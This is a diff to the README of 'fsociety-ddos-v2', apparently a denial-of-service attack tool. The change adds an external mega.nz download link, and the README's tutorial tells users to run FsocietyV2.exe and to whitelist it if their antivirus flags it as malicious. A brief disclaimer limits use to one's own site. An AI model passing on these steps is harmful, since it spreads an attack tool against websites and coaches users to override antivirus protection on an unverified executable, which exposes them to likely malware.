@@ -2,7 +2,9 @@
 # Warning: Do not use this tool for any illegal purposes. This tool can be only used for experimental purposes on your own website or if the owner of the website gives you permission.
 ___________________________________________________________
 # TUTORIAL
-Unzip the fsociety-ddos-v2 folder on your computer.
+Unzip the fsociety-ddos-v2 folder on your computer using winrar.
+
+Since the github file size limit is small for the file please use this link: https://mega.nz/file/i0YiTBAD#la1btaXzqNQ16O4fb4Jmvk3NMKU7yDyQfiYSCv7XMx8
 
 If you unzipped the folder open the FsocietyV2.exe file. If your antivirus flagges the file as malicious whitelist the file in your antivirus settings.
 After opening the file an interface as seen below should popup.
